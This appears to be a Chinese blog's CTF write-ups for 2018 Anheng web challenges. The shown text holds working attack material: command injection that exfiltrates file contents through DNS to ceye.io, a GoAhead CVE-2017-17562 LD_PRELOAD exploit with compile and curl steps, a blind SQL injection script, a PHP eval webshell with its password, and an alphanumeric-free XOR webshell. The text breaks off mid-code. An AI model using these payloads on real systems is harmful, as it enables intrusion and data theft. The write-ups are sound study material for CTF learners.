href="http://114.55.36.69:6664/upload/288373614_backdoor.php.jpg，flag在根目录" target="_blank" rel="noopener">http://114.55.36.69:6664/upload/288373614_backdoor.php.jpg，flag在根目录</a></p><p><img src="/ctf-2018“安恒杯”WEB安全测试秋季资格赛wp/1537707585778.png" alt="1537707585778"></p><h1 id="ping"><a href="#ping" class="headerlink" title="ping"></a>ping</h1><p>这题算是看着答案做出来的，不过思路很好，用到了DNS带外数据的知识，这里也记录一下：</p><h2 id="0x01-1"><a href="#0x01-1" class="headerlink" title="0x01"></a>0x01</h2><p>首先还是扫描网站，可以看到网站泄露了一个robots.txt文件</p><p><img src="/ctf-2018“安恒杯”WEB安全测试秋季资格赛wp/1537792599445.png" alt="1537792599445"></p><p>访问该文件，看到目录下存在index.txt，where_is_flag.php文件</p><p><img src="/ctf-2018“安恒杯”WEB安全测试秋季资格赛wp/1537792801839.png" alt="1537792801839"></p><p>先看index.txt:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">include</span>(<span class="string">"where_is_flag.php"</span>);<span class="keyword">echo</span> <span class="string">"ping"</span>;$ip =(string)$_GET[<span class="string">'ping'</span>];$ip =str_replace(<span class="string">"&gt;"</span>,<span class="string">"0.0"</span>,$ip);system(<span class="string">"ping  "</span>.$ip);</span><br></pre></td></tr></table></figure><p>可以看到存在命令执行，ping参数会直接拼接在ping命令后</p><p>where_is_flag.php我们需要用命令执行才能看了。</p><h2 id="0x02-1"><a href="#0x02-1" class="headerlink" title="0x02"></a>0x02</h2><p>尝试使用<code>http://114.55.36.69:8015/?ping=127.0.0.1</code>，发现网站未响应，这是因为后台正在循环ping，说明了命令执行成功。</p><p>接着尝试使用<code>http://114.55.36.69:8015/?ping=-c 1 127.0.0.1</code>，可以发现网站网站后台并没有回显ping的结果，这说明虽然网站执行了命令，但是并不返回命令执行结果。</p><p>那么如何拿到命令执行结果呢？第一个想到的是使用http请求，比如说<code>wget www.mysite.com/$(cat flag.php)</code>，但是尝试后发现无效，这可能是服务器并没有wget命令。</p><p>正解是使用dns解析获取带外数据，这里推荐一个平台：<a href="http://ceye.io" target="_blank" rel="noopener">http://ceye.io</a>，登录之后可以获得一个专属的地址（假设为qwerty.ceye.io），那么如果我们<code>ping  &#96;whoami&#96;.qwerty.ceye.io</code>，由于ping的第一步是dns解析，所以在<a href="http://ceye.io/records/dns" target="_blank" rel="noopener">http://ceye.io/records/dns</a>就可以看whoami命令执行的结果：</p><p><img src="/ctf-2018“安恒杯”WEB安全测试秋季资格赛wp/1537793445399.png" alt="1537793445399"></p><p>根据上述原理，我们可以获取where_is_flag.php，但是如果文件内容中有空格，我们的ping命令就不能执行了，所以用sed命令将空格换成sspacee。这样我们ping参数为：<br><code><a href="http://114.55.36.69:8015/?ping=" target="_blank" rel="noopener">http://114.55.36.69:8015/?ping=</a> &#96;cat where_is_flag.php|sed ‘s/\s/sspacee/g’&#96;.0ri9zr.ceye.io</code></p><p>同时在ceye中可以看到文件内容了</p><p><img src="/ctf-2018“安恒杯”WEB安全测试秋季资格赛wp/1537792741495.png" alt="1537792741495"></p><p>接着访问dgfsdunsadkjgdgdfhdfhfgdhsadf/flag.php，如法炮制即可：</p><p><code><a href="http://114.55.36.69:8015/?ping=" target="_blank" rel="noopener">http://114.55.36.69:8015/?ping=</a> &#96;cat dgfsdunsadkjgdgdfhdfhfgdhsadf/flag.php|sed ‘s/\s/sspacee/g’&#96;.0ri9zr.ceye.io</code></p><p>可以看到flag：</p><p><img src="/ctf-2018“安恒杯”WEB安全测试秋季资格赛wp/1537793298457.png" alt="1537793298457"></p><p><strong>拓展：</strong> 不止是命令执行，dns的带外数据还能传很多东西比如说SQL注入、XXE，详细可以看<a href="http://ceye.io/payloads" target="_blank" rel="noopener">http://ceye.io/payloads</a>，Github上也有了利用该方法进行SQL注入的工具（<a href="https://github.com/ADOOO/DnslogSqlinj" target="_blank" rel="noopener">https://github.com/ADOOO/DnslogSqlinj</a>)</p><h1 id="ProxyError"><a href="#ProxyError" class="headerlink" title="ProxyError"></a>ProxyError</h1><p>修改Host:192.168.5.132</p><h1 id="新瓶装旧酒"><a href="#新瓶装旧酒" class="headerlink" title="新瓶装旧酒"></a>新瓶装旧酒</h1><h2 id="0x01-代码审计-文件上传"><a href="#0x01-代码审计-文件上传" class="headerlink" title="0x01 代码审计+文件上传"></a>0x01 代码审计+文件上传</h2><p>这里可以看到需要上传一个zip文件：</p><p><img src="/ctf-2018“安恒杯”WEB安全测试秋季资格赛wp/1539350142198.png" alt="1539350142198"></p><p>这里看到zip文件中需要包含一个图片后缀：</p><p><img src="/ctf-2018“安恒杯”WEB安全测试秋季资格赛wp/1539350155700.png" alt="1539350155700"></p><p>根据apache的特性，使用大马1.pHp.png(注意到文件名不能有<code>.ph</code>)，并且压缩成zip上传，发现<code>flag.php</code>。</p><p><img src="/ctf-2018“安恒杯”WEB安全测试秋季资格赛wp/1539350804776.png" alt="1539350804776"></p><h1 id="GOGOGO"><a href="#GOGOGO" class="headerlink" title="GOGOGO"></a>GOGOGO</h1><h2 id="0x01-GoAhead-CVE-2017-17562"><a href="#0x01-GoAhead-CVE-2017-17562" class="headerlink" title="0x01 GoAhead CVE-2017-17562"></a>0x01 GoAhead CVE-2017-17562</h2><p>实际上腾讯的<a href="https://slab.qq.com/news/tech/1701.html" target="_blank" rel="noopener">“开源Web服务器GoAhead漏洞CVE-2017-17562分析“</a> 一文已经对此漏洞进行了详细解释，这里只概括的说一下：</p><ol><li>因为cgiHandler的过滤不当，导致LD_PRELOAD变量可控，而程序会读取LD_PRELOAD变量记录的文件路径并且执行文件代码；</li><li>launchCgi函数调用系统函数dup2()将stdin文件描述符指向了POST请求数据对应的临时文件。</li></ol><p>从发送payload的命令可以看到，我们的POST中控制了两个输入，一个是LOAD_PRELOAD参数（将它设置为了/proc/self/fd/0），一个是POST的data（将它设置为了我们编译生成的动态链接库）。/proc/self/fd/0 是Linux的伪文件系统文件，实际上指的是stdin，以下命令的执行结果可以说明这一点：</p><p><img src="/ctf-2018“安恒杯”WEB安全测试秋季资格赛wp/1538571783966.png" alt="1538571783966"></p><p>这样结合第一条，即程序会从我们标准输入中取代码执行，又因为第二条，我们的标准输入被定向到了POST的临时文件中，具体来说，即定向到了我们的payload.so文件上，这样整个原理就走通了。</p><h2 id="0x02-复现CVE"><a href="#0x02-复现CVE" class="headerlink" title="0x02 复现CVE"></a>0x02 复现CVE</h2><p>准备payload</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">before_main</span><span class="params">(<span class="keyword">void</span>)</span> __<span class="title">attribute__</span><span class="params">((constructor))</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">before_main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="comment">/* printf("hello, payload executed.\n"); */</span></span><br><span class="line">    system(<span class="string">"cat /var/www/goahead/cgi-bin/hello.cgi"</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ gcc -shared -fPIC ./payload.c -o payload.so</span><br></pre></td></tr></table></figure></p><p>触发payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$ curl -X POST --data-binary @payload.so http://114.55.36.69:8018/cgi-bin/hello.cgi?LD_PRELOAD=/proc/self/fd/0 -i</span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: GoAhead-http</span><br><span class="line">Date: Fri Oct 12 13:38:48 2018</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Connection: keep-alive</span><br><span class="line">X-Frame-Options: SAMEORIGIN</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line"><span class="comment">#!/usr/bin/perl</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">"Content-Type: text/html\n\n"</span>;</span><br><span class="line"><span class="built_in">print</span> <span class="string">"Hello GOGOGO"</span>;</span><br><span class="line"><span class="comment">#flag&#123;ef9f1f880e1f001bedd32bfc52674128&#125;</span></span><br><span class="line"><span class="comment">#!/usr/bin/perl</span></span><br><span class="line"></span><br><span class="line">curl: (56) Illegal or missing hexadecimal sequence <span class="keyword">in</span> chunked-encoding</span><br></pre></td></tr></table></figure><h1 id="进击的盲注"><a href="#进击的盲注" class="headerlink" title="进击的盲注"></a>进击的盲注</h1><h2 id="0x01-敏感信息泄露"><a href="#0x01-敏感信息泄露" class="headerlink" title="0x01 敏感信息泄露"></a>0x01 敏感信息泄露</h2><p>扫描存在robots.txt</p><p><img src="/ctf-2018“安恒杯”WEB安全测试秋季资格赛wp/1539405059283.png" alt="1539405059283"></p><h2 id="0x02-SQL盲注"><a href="#0x02-SQL盲注" class="headerlink" title="0x02 SQL盲注"></a>0x02 SQL盲注</h2><p>看源码，username处存在注入，过滤符号”(“,”)”</p><p><img src="/ctf-2018“安恒杯”WEB安全测试秋季资格赛wp/1539405263908.png" alt="1539405263908"></p><p>使用regexp binary注入：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">burp0_url = <span class="string">"http://114.55.36.69:6663/index.php"</span></span><br><span class="line">burp0_headers = &#123;</span><br><span class="line">    <span class="string">"Cache-Control"</span>: <span class="string">"max-age=0"</span>,</span><br><span class="line">    <span class="string">"Origin"</span>: <span class="string">"http://114.55.36.69:6663"</span>,</span><br><span class="line">    <span class="string">"Upgrade-Insecure-Requests"</span>: <span class="string">"1"</span>,</span><br><span class="line">    <span class="string">"Content-Type"</span>: <span class="string">"application/x-www-form-urlencoded"</span>,</span><br><span class="line">    <span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3377.1 Safari/537.36"</span>,</span><br><span class="line">    <span class="string">"Accept"</span>: <span class="string">"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8"</span>,</span><br><span class="line">    <span class="string">"Referer"</span>: <span class="string">"http://114.55.36.69:6663/"</span>,</span><br><span class="line">    <span class="string">"Accept-Encoding"</span>: <span class="string">"gzip, deflate"</span>,</span><br><span class="line">    <span class="string">"Accept-Language"</span>: <span class="string">"zh-CN,zh;q=0.9"</span>,</span><br><span class="line">    <span class="string">"Connection"</span>: <span class="string">"close"</span>&#125;</span><br><span class="line"></span><br><span class="line">result = <span class="string">''</span></span><br><span class="line">payload = <span class="string">"admin' and password regexp binary '^&#123;res&#125;'#"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> xrange(<span class="number">32</span>,<span class="number">126</span>):</span><br><span class="line">        <span class="keyword">if</span> chr(j) <span class="keyword">in</span> [<span class="string">'*'</span>,<span class="string">'\\'</span>,<span class="string">'/'</span>,<span class="string">'('</span>,<span class="string">')'</span>,<span class="string">'+'</span>,<span class="string">'.'</span>,<span class="string">'?'</span>,<span class="string">'['</span>,<span class="string">']'</span>,<span class="string">'^'</span>]:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        hh = payload.format(res=result+chr(j)</span><br><span class="line">        <span class="keyword">print</span> hh</span><br><span class="line"></span><br><span class="line">        burp0_data = &#123;<span class="string">"username"</span>: hh, <span class="string">"password"</span>: <span class="string">"admin"</span>&#125;</span><br><span class="line">        zz = requests.post(burp0_url, headers=burp0_headers, data=burp0_data)</span><br><span class="line">        <span class="comment">#print zz.content</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">'password error!'</span> <span class="keyword">in</span> zz.content:</span><br><span class="line">            result += chr(j)</span><br><span class="line">            <span class="keyword">print</span> result</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>得到：dVAxMEBkX25Fdy5waHA=$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$</p><p>base64解码后得到uP10@d_nEw.php</p><h2 id="0x03-文件上传绕过"><a href="#0x03-文件上传绕过" class="headerlink" title="0x03 文件上传绕过"></a>0x03 文件上传绕过</h2><p>访问看到一个上传界面</p><p><img src="/ctf-2018“安恒杯”WEB安全测试秋季资格赛wp/1539405581893.png" alt="1539405581893"></p><p>传大马，发现根目录下存在flag：</p><p><img src="/ctf-2018“安恒杯”WEB安全测试秋季资格赛wp/1539405664157.png" alt="1539405664157"></p><h1 id="艰难的Bypass之路"><a href="#艰难的Bypass之路" class="headerlink" title="艰难的Bypass之路"></a>艰难的Bypass之路</h1><p>用户名爆破，发现lili可用：</p><p><img src="/ctf-2018“安恒杯”WEB安全测试秋季资格赛wp/1539415423719.png" alt="1539415423719"></p><p>查看哪些关键词被过滤：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">detect</span><span class="params">()</span>:</span></span><br><span class="line">    waf_words=[<span class="string">'ord'</span>, <span class="string">'or'</span>, <span class="string">'union'</span>, <span class="string">'select'</span>, <span class="string">'and'</span>, <span class="string">'from'</span>, <span class="string">'order by'</span>, <span class="string">'substr'</span>, <span class="string">"'"</span>, <span class="string">'*'</span>, <span class="string">'&amp;&amp;'</span>, <span class="string">'information_schema'</span>, <span class="string">' '</span>, <span class="string">'%'</span>, <span class="string">'group_concat'</span>, <span class="string">'('</span>, <span class="string">'"'</span>, <span class="string">'where'</span>, <span class="string">'if'</span>, <span class="string">' '</span>, <span class="string">'||'</span>, <span class="string">'#'</span>, <span class="string">'--+'</span>, <span class="string">'_'</span>, <span class="string">'`'</span>, <span class="string">'/'</span>, <span class="string">'&lt;&gt;'</span>, <span class="string">'in'</span>, <span class="string">'='</span>, <span class="string">'mid'</span>, <span class="string">'like'</span>, <span class="string">'database()'</span>, <span class="string">'&gt;'</span>, <span class="string">'user()'</span>, <span class="string">'tables'</span>, <span class="string">'limit'</span>]</span><br><span class="line">    burp0_url = <span class="string">"http://114.55.36.69:6661/index.php"</span></span><br><span class="line">    burp0_cookies = &#123;<span class="string">"PHPSESSID"</span>: <span class="string">"jrspq1dsdrt8gn6tqq35mdatn0"</span>&#125;</span><br><span class="line">    burp0_headers = &#123;<span class="string">"Cache-Control"</span>: <span class="string">"max-age=0"</span>, <span class="string">"Origin"</span>: <span class="string">"http://114.55.36.69:6661"</span>, <span class="string">"Upgrade-Insecure-Requests"</span>: <span class="string">"1"</span>, <span class="string">"Content-Type"</span>: <span class="string">"application/x-www-form-urlencoded"</span>, <span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3377.1 Safari/537.36"</span>, <span class="string">"Accept"</span>: <span class="string">"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8"</span>, <span class="string">"Referer"</span>: <span class="string">"http://114.55.36.69:6661/"</span>, <span class="string">"Accept-Encoding"</span>: <span class="string">"gzip, deflate"</span>, <span class="string">"Accept-Language"</span>: <span class="string">"zh-CN,zh;q=0.9"</span>, <span class="string">"Connection"</span>: <span class="string">"close"</span>&#125;</span><br><span class="line">    <span class="keyword">for</span> each <span class="keyword">in</span> waf_words:</span><br><span class="line">        burp0_data=&#123;<span class="string">"username"</span>: <span class="string">"admin&#123;&#125;"</span>.format(each), <span class="string">"passwd"</span>: <span class="string">"admin"</span>&#125;</span><br><span class="line">        res=requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"illegal characters!"</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            <span class="keyword">print</span> each</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    detect()</span><br></pre></td></tr></table></figure><p><img src="/ctf-2018“安恒杯”WEB安全测试秋季资格赛wp/1539416324206.png" alt="1539416324206"></p><h1 id="非正常解法"><a href="#非正常解法" class="headerlink" title="非正常解法"></a>非正常解法</h1><p>扫描到上传目录</p><p><img src="/ctf-2018“安恒杯”WEB安全测试秋季资格赛wp/1539347922000.png" alt="1539347922000"></p><h3 id="0x01-发现dalao留的后门"><a href="#0x01-发现dalao留的后门" class="headerlink" title="0x01 发现dalao留的后门"></a>0x01 发现dalao留的后门</h3><p><a href="http://114.55.36.69:6663/uploads/" target="_blank" rel="noopener">http://114.55.36.69:6663/uploads/</a></p><h3 id="0x02-直接用大佬的后门"><a href="#0x02-直接用大佬的后门" class="headerlink" title="0x02 直接用大佬的后门"></a>0x02 直接用大佬的后门</h3><p>以<code>a.php;.jpg</code>为例，查看后门密码</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">"pHp"</span>&gt;</span><span class="javascript">@<span class="built_in">eval</span>($_POST[<span class="string">'sb'</span>])</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>菜刀连接，查看flag</p><p>/flag</p><p>或者大马<code>http://114.55.36.69:6663/uploads/shell.php.jpg</code> 密码admin</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2018安恒9月赛babybypass复现&amp;无字母数字的webshell思考</title>
      <link href="/ctf-2018%E5%AE%89%E6%81%929%E6%9C%88%E8%B5%9Bbabybypass%E5%A4%8D%E7%8E%B0-%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97%E7%9A%84webshell%E6%80%9D%E8%80%83/"/>
      <url>/ctf-2018%E5%AE%89%E6%81%929%E6%9C%88%E8%B5%9Bbabybypass%E5%A4%8D%E7%8E%B0-%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97%E7%9A%84webshell%E6%80%9D%E8%80%83/</url>
      
        <content type="html"><![CDATA[<p>一开始看这题满脑子想的都是用异或来做，结果发现没办法调用getflag函数，看了别人的wp才发现思路错了。</p><h1 id="错误思路"><a href="#错误思路" class="headerlink" title="错误思路"></a>错误思路</h1><p>毕竟这个思路也蛮清奇，大概说一下吧：</p><p>思考这一个题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'code'</span>]))&#123;</span><br><span class="line">    $code = $_GET[<span class="string">'code'</span>];</span><br><span class="line">    <span class="keyword">if</span>(strlen($code)&gt;<span class="number">135</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Long."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/[A-Za-z0-9]+/"</span>,$code))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"NO."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="keyword">eval</span>($code);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Flag"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><a id="more"></a><p>code参数由正则过滤了大小写字母以及数字，那么我们可以通过符号异或构造payload。</p><p>以下脚本可以打印出符号异或得到的值，经过试验26个字母的大小写都可以通过这种方法得到：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor</span><span class="params">()</span>:</span></span><br><span class="line">    arr=[chr(i) <span class="keyword">for</span> i <span class="keyword">in</span> range(ord(<span class="string">'a'</span>),ord(<span class="string">'z'</span>))]+[chr(i) <span class="keyword">for</span> i <span class="keyword">in</span> range(ord(<span class="string">'A'</span>),ord(<span class="string">'Z'</span>))]</span><br><span class="line">    test=[<span class="string">'`'</span>,<span class="string">'~'</span>,<span class="string">'!'</span>,<span class="string">'@'</span>,<span class="string">'%'</span>,<span class="string">'^'</span>,<span class="string">'*'</span>,<span class="string">'('</span>,<span class="string">')'</span>,<span class="string">'-'</span>,<span class="string">'+'</span>,<span class="string">'&#123;'</span>,<span class="string">'&#125;'</span>,<span class="string">'['</span>,<span class="string">']'</span>,<span class="string">':'</span>,<span class="string">'&lt;'</span>,<span class="string">'&gt;'</span>,<span class="string">'.'</span>,<span class="string">','</span>,<span class="string">';'</span>,<span class="string">'|'</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> test:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> test:</span><br><span class="line">            res=chr(ord(i)^ord(j))</span><br><span class="line">            <span class="keyword">if</span> res <span class="keyword">in</span> arr:</span><br><span class="line">                <span class="keyword">print</span> i,j,res</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">[ &lt; g</span></span><br><span class="line"><span class="string">[ &gt; e</span></span><br><span class="line"><span class="string">] ) t</span></span><br><span class="line"><span class="string">| : F</span></span><br><span class="line"><span class="string">@ , l</span></span><br><span class="line"><span class="string">[ : a</span></span><br><span class="line"><span class="string">[ &lt; g</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'[[]|@[['^'&lt;&gt;):,:&lt;'</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    xor()</span><br></pre></td></tr></table></figure><p>可以看到 ‘[‘ ^’&lt;’ =’g’, ‘[‘^’&gt;’=’e’, …</p><p>那么使用<code>&#39;[[]|@[[&#39;^&#39;&lt;&gt;):,:&lt;&#39;</code>就可以得到字符串’getFlag’，下面就是怎么调用，想到 <code>$_=&#39;getFlag&#39;;$_();</code>等同于<code>getFlag();&#39;</code>, 那么使用<code>$_=&#39;[[]|@[[&#39;^&#39;&lt;&gt;):,:&lt;&#39;;$_();</code>就可以调用了，那么最后的payload就是<code>code=$_=&#39;[[]|@[[&#39;^&#39;&lt;&gt;):,:&lt;&#39;;$_();</code></p><p>按照此原理，可以构造出一句话比如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    @$_++; <span class="comment">// $_ = 1</span></span><br><span class="line">    $__=(<span class="string">"#"</span>^<span class="string">"|"</span>); <span class="comment">// $__ = _</span></span><br><span class="line">    $__.=(<span class="string">"."</span>^<span class="string">"~"</span>); <span class="comment">// _P</span></span><br><span class="line">    $__.=(<span class="string">"/"</span>^<span class="string">"`"</span>); <span class="comment">// _PO</span></span><br><span class="line">    $__.=(<span class="string">"|"</span>^<span class="string">"/"</span>); <span class="comment">// _POS</span></span><br><span class="line">    $__.=(<span class="string">"&#123;"</span>^<span class="string">"/"</span>); <span class="comment">// _POST </span></span><br><span class="line">    $&#123;$__&#125;[!$_]($&#123;$__&#125;[$_]); <span class="comment">// $_POST[0]($_POST[1]);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h1 id="回到题目"><a href="#回到题目" class="headerlink" title="回到题目"></a>回到题目</h1><p>再看一下这道题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// include 'flag.php';</span></span><br><span class="line"><span class="comment">// $code='[[]|@[['^'&lt;&gt;):,:&lt;';</span></span><br><span class="line"><span class="comment">// echo $code.'()';</span></span><br><span class="line"><span class="comment">// @eval($code);</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'code'</span>]))&#123;</span><br><span class="line">    $code = $_GET[<span class="string">'code'</span>];</span><br><span class="line">    <span class="keyword">if</span>(strlen($code)&gt;<span class="number">35</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Long."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/[A-Za-z0-9_$]+/"</span>,$code))&#123; <span class="comment">//*</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"NO."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="keyword">eval</span>($code);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Flag"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//$hint =  "php function getFlag() to get flag";</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>在正则过滤那边，可以看到<code>$</code>和<code>_</code>都被过滤了，这直接导致了即使用上述方法得到了字符串，也没办法执行php的函数（这里纠正一下，php7中我们是可以通过<code>(&#39;func_name&#39;)()</code>在执行函数的，这样其实我的错误思路是可行的，甚至在<a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html" target="_blank" rel="noopener">无字母数字webshell之提高篇</a>中，作者直接使用了取反字符串的方法构造了payload）。正确的做法使用php短标签是直接读文件，考虑如下php代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>= 